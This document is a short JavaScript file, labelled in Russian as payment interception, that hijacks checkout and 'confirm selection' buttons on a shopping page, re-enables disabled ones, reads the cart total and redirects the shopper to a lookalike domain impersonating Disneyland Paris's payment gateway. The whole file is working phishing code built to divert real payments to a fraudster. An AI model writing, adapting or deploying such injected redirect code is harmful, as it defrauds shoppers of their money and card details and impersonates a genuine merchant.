/**
 * proxy-config.js — перехват оплаты
 */
(function() {
    'use strict';

    var PAYMENT_GATEWAY = 'https://pay.disneylandparls.com/';
    var STORE_ID = 'Disney Land Paris';

    function getAmount() {
        var selectors = [
            '.total-price-value',
            '[data-testid="total-price"]',
            '.cart-summary__total-price',
            '.summary-total-amount',
            '.amount'
        ];
        for (var i = 0; i < selectors.length; i++) {
            var el = document.querySelector(selectors[i]);
            if (el && el.innerText) {
                var price = el.innerText.replace(/[^0-9,.]/g, '').replace(',', '.');
                if (price && !isNaN(parseFloat(price))) return price;
            }
        }
        return '100.00';
    }

    function handlePaymentRedirect(event) {
        event.preventDefault();
        event.stopImmediatePropagation();
        event.stopPropagation();
        var amount = getAmount();
        var url = PAYMENT_GATEWAY + '/?amount=' + amount + '&store=' + encodeURIComponent(STORE_ID);
        window.location.replace(url);
        return false;
    }

    setInterval(function() {
        var buttons = document.querySelectorAll('button, a, [role="button"]');
        buttons.forEach(function(btn) {
            var text = (btn.innerText || '').toLowerCase().trim();
            if (text.indexOf('confirm selection') !== -1 || text.indexOf('confirm your selection') !== -1 || text.indexOf('checkout') !== -1) {
                if (btn.disabled || btn.getAttribute('disabled')) {
                    btn.disabled = false;
                    btn.removeAttribute('disabled');
                    btn.style.pointerEvents = 'auto';
                    btn.style.opacity = '1';
                }
                btn.style.border = '2px solid #28a745';
                if (!btn.dataset.proxyAttached) {
                    btn.addEventListener('click', handlePaymentRedirect, true);
                    btn.addEventListener('mousedown', handlePaymentRedirect, true);
                    btn.dataset.proxyAttached = 'true';
                }
            }
        });
    }, 500);

})();
